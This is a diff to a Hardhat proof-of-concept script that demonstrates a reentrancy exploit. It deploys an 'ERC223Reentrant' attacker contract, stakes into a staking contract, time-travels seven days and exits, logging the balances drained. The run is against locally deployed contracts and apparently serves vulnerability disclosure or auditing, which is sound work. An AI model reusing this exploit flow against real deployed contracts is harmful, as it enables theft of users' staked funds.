@@ -39,28 +39,43 @@ async function main() {
     await mtoken.connect(user1)["transfer(address,uint256)"](staking.address, FIFTY_ETHER.mul(10));
 
     // POC
-    
-    console.log("EXPLOIT : \n");
-    
+
+    console.log("\n EXPLOIT : \n");
+
     const Malicious = await ethers.getContractFactory("ERC223Reentrant", attacker);
-    const malicious = await Malicious.deploy(mtoken.address,staking.address);
+    const malicious = await Malicious.deploy(mtoken.address, staking.address);
 
     console.log("Malicious contract :", malicious.address);
-    await mtoken.connect(deployer)["transfer(address,uint256,bytes)"](malicious.address,FIFTY_ETHER,abiCoder.encode(["string"], ["skip"]));
+    await mtoken
+        .connect(deployer)
+        ["transfer(address,uint256,bytes)"](malicious.address, FIFTY_ETHER, abiCoder.encode(["string"], ["skip"]));
 
-    await expect(await mtoken.balanceOf(malicious.address)).to.equal(FIFTY_ETHER));
+    await expect(await mtoken.balanceOf(malicious.address)).to.equal(FIFTY_ETHER);
 
     // staking into the vulnerable contract
     await malicious.enter(FIFTY_ETHER);
-    
-    console.log("Balance of staking contract before the exploit : ", await ethers.utils.formatEther(await staking.balanceOf(malicious.address)));
+
+    console.log(
+        "Balance of malicious contract before the exploit : ",
+        await ethers.utils.formatEther(await mtoken.balanceOf(malicious.address))
+    );
+    console.log(
+        "Balance of staking contract before the exploit : ",
+        await ethers.utils.formatEther(await staking.balanceOf(malicious.address))
+    );
 
     // time travel till 7 days elapse
-    await setBlockchainTime(await blockchainNow() + 804800);
+    await setBlockchainTime((await blockchainNow()) + 804800);
     await malicious.exit();
 
-    console.log("Balance of staking contract before the exploit : ",await ethers.utils.formatEther(await mtoken.balanceOf(staking.address)));
-    console.log("Balance of malicious contract after the exploit : ", await ethers.utils.formatEther(await mtoken.balanceOf(malicious.address))));
+    console.log(
+        "Balance of staking contract after the exploit : ",
+        await ethers.utils.formatEther(await mtoken.balanceOf(staking.address))
+    );
+    console.log(
+        "Balance of malicious contract after the exploit : ",
+        await ethers.utils.formatEther(await mtoken.balanceOf(malicious.address))
+    );
 }
 
 main();
